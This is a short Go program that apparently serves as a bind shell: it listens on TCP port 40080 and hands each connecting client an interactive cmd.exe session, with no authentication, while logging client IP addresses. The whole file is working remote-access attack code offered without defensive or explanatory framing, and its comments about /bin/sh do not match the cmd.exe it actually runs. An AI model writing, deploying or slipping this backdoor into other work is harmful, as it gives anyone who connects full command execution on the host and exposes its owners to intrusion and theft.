package main

import (
	"log"
	"net"
	"os/exec"
	"io"
	"strings"
)

func handle(conn net.Conn) {

	clientIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	// Windows needs to use exec.Command("cmd.exe")

	cmd := exec.Command("cmd.exe")

	// Set stdin to our connection
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()

	log.Println("Connection closed: ", clientIP)
}

func main() {
	// Listen on local port 40080
	// Requires admin rights to add a firewall rule if the default firewall is enabled
	listener, err := net.Listen("tcp", ":40080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	} else {
		log.Printf("Listening on port 40080\n")
	}

	for {
		conn, err := listener.Accept()
		clientIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}

		log.Println("Received connection from: ", clientIP)

		go handle(conn)
	}
}